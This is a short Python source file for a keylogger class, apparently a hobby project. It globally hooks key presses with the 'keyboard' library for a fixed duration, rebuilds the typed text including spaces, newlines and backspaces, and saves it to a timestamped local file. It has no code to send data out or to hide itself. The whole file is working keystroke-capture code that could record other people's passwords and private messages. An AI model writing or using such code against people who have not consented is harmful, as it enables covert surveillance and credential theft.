import keyboard
import datetime
import sched
from utils import stringDec
import json


settings = open('settings.json', 'r').read()
settings = json.loads(settings)
stringDec("SETTINGS", print, settings)


APPEND_MODE = settings["APPEND_MODE"]


class KeyLogger:
    def __init__(self, duration=10):
        self.duration = duration
        self.end_time = datetime.datetime.now() + datetime.timedelta(seconds=self.duration)
        self.logfile = f"keylog[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')},{self.duration}].txt"
        self.strokes = ""

    def callback(self, event):
        if event.name == 'space':
            self.strokes += ' '
        elif event.name == 'backspace':
            try:
                self.strokes = self.strokes[:-1]
            except:
                pass
        elif event.name == 'enter':
            self.strokes += '\n'
        else:
            self.strokes += event.name

    def wait_until_end(self):
        while datetime.datetime.now() < self.end_time:
            pass

    def start_logging(self):
        keyboard.on_press(self.callback, suppress=True)
        self.wait_until_end()
        self.stop_logging()

    def stop_logging(self):
        keyboard.unhook_all()
        if APPEND_MODE:
            with open(self.logfile, 'a') as f:
                f.write(self.strokes)
        else:
            with open(self.logfile, 'w') as f:
                f.write(self.strokes)
